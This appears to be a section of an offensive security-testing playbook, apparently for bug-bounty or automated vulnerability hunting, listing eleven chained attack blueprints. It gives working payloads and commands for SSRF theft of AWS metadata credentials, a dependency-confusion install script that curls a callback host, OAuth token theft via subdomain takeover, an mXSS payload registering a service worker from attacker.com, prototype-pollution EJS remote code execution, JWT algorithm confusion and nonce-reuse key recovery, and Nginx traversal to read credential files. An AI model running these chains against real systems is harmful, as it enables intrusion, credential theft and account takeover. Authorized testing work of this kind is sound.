# ZDH Phase 23: Chained Attack Blueprints

## Phase 23 - Chained Attack Blueprints

**The most impactful section. Chains = Critical findings. Single vulns = Medium at best.**

### Chain A: Info Disclosure -> IDOR -> Mass PII Exfil
```
1. Phase 3 (headers): Extract token format from response headers
2. Token structure reveals: newuid = sequential integer
3. Phase 7 (JWT): Decode auth token -> find user ID field
4. Swap your user ID with +1/-1 -> do you get other user's data?
5. If yes: extract name, address, phone, order history = CONFIRMED CRITICAL
Evidence needed: actual PII response with another user's data
```

### Chain B: SSRF -> Cloud Metadata -> Full AWS Access
```
1. Find SSRF parameter (Phase 8)
2. url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
3. Read role name from response
4. url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
5. Extract: AccessKeyId, SecretAccessKey, Token
6. aws sts get-caller-identity --profile compromised  -> confirms access
7. aws s3 ls -> list all S3 buckets
8. aws secretsmanager list-secrets -> all application secrets
Evidence needed: actual AWS credentials + successful sts:GetCallerIdentity call
```

### Chain C: GitHub Credential -> Live API -> Data Access
```
1. Find credential in GitHub test files (Phase 4)
2. Test against live API (not just test environment)
3. With valid API key: enumerate all accessible endpoints
4. Find endpoint returning PII/business data without additional auth
5. Extract sample data as evidence
Evidence needed: API call returning real sensitive data with leaked key
```

### Chain D: Dependency Confusion -> CI/CD -> RCE
```
1. Confirm internal package name (stack trace, pom.xml)
2. Confirm namespace unclaimed publicly (Phase 6)
3. Confirm private Nexus exists (DNS)
4. Request authorization for DNS-only PoC
5. With auth: register package name publicly with version=99.0.0
6. Package's install script: curl <interactsh>/?host=$(hostname)
7. If callback received from CI runner = CONFIRMED RCE in build pipeline
Evidence needed: interactsh callback from target's build infrastructure
```

### Chain E: Subdomain Takeover -> OAuth Token Theft
```
1. Find dangling CNAME (Phase 11): sub.target.com -> unclaimed.github.io
2. Claim the GitHub Pages repo (or Heroku app, etc.)
3. Host page: <script>document.location="https://target.com/oauth/authorize?...&redirect_uri=https://sub.target.com/steal"</script>
4. OAuth redirects back to your controlled subdomain with access_token in URL
5. Harvest token, make API calls as victim
Evidence needed: demonstrate token receipt on controlled page (with own test account)
```

### Chain F: JWT RS256 Public Key -> Account Takeover
```
1. Fetch public key: GET /.well-known/jwks.json
2. Decode your JWT, check alg=RS256
3. Create forged JWT:
   - Change alg to HS256
   - Change payload: role=admin, userId=<target_user_id>
   - Sign with PUBLIC KEY as HMAC secret (the confusion attack)
4. Send forged JWT to API
5. If accepted: full account takeover / admin access
Evidence needed: API response showing other user's data with forged token
```

### Chain G: mXSS -> Service Worker -> Persistent Session Hijack (Black Hat / DEF CON)
```
1. Find DOMPurify version < 3.1.3 in JS bundles (grep for version string)
2. Find any field where user input is sanitized then re-inserted into innerHTML
3. Inject mXSS payload (MathML namespace confusion):
   <math><mtext><table><mglyph><style><!--</style><img title="--></style><img src onerror="
   navigator.serviceWorker.register('https://attacker.com/sw.js')">
4. Service worker installed on victim's browser persists for weeks
5. SW intercepts every request: captures tokens, session cookies, form submissions
Evidence needed: service worker appears in DevTools, requests intercepted to your server
```

### Chain H: PDF Generator SSRF -> AWS Metadata -> IAM Credentials
```
1. Find "Export PDF" / "Generate Report" / "Print Invoice" feature (Phase 26)
2. Inject into any field that renders in PDF:
   <iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
3. Download PDF, extract text layer - IAM role name appears in PDF content
4. Second request: <iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"></iframe>
5. AccessKeyId + SecretAccessKey + Token in PDF = full cloud access
Evidence needed: AWS credentials visible in PDF + sts:GetCallerIdentity confirms access
```

### Chain I: Prototype Pollution -> EJS Gadget -> Server RCE (USENIX 2023)
```
1. Find Node.js app using lodash.merge, qs, or any deep-merge on user input
2. Fuzz JSON body: {"__proto__":{"polluted":"yes"}} -> check if reflected anywhere
3. If pollution confirmed, escalate to EJS RCE gadget:
   POST /api/settings {"__proto__":{"outputFunctionName":"x;require('child_process').execSync('curl https://your-interactsh-url/$(id)')//"}
4. Trigger any EJS template render (GET /dashboard, /profile, etc.)
5. Interactsh callback with whoami output = CONFIRMED RCE
Evidence needed: DNS/HTTP callback from server with command output
```

### Chain J: ECDSA Nonce Reuse -> Private Key Recovery -> Mass Account Takeover
```
1. Collect 50+ ES256 JWT tokens from the same app
2. Decode each: base64url decode signature, extract r and s components
3. Check for identical r values - same r = same nonce k used twice
4. Recover private key: k = (h1-h2)/(s1-s2) mod n; d = (s1*k - h1)/r mod n
5. Forge JWT for any user ID with recovered private key
6. OR: if Java 15-18, try Psychic Signatures (blank sig): alg=ES256, sig=base64(00...00)
Evidence needed: forged JWT accepted, returns other user's account data
```

### Chain K: Nginx Alias Traversal -> App Source Code -> Hardcoded Creds -> DB Access
```
1. Find static file serving: /static/, /assets/, /media/, /uploads/
2. Test alias traversal: curl https://<target>/static../etc/passwd
3. If 200 with file content: confirmed off-by-slash in Nginx config
4. Target app source: /static../app/config.py, /assets../app/.env, /media../app/settings.py
5. Extract DB credentials, API keys, signing secrets from source
6. Use DB credentials to connect directly to database (if port exposed)
Evidence needed: source file contents with credentials + successful DB/API auth
```

**Signal:** `emit_signal VULN_CONFIRMED "Chain confirmed: <chain-letter> -> <final-impact>" "main/zerodayhunt" 0.97`
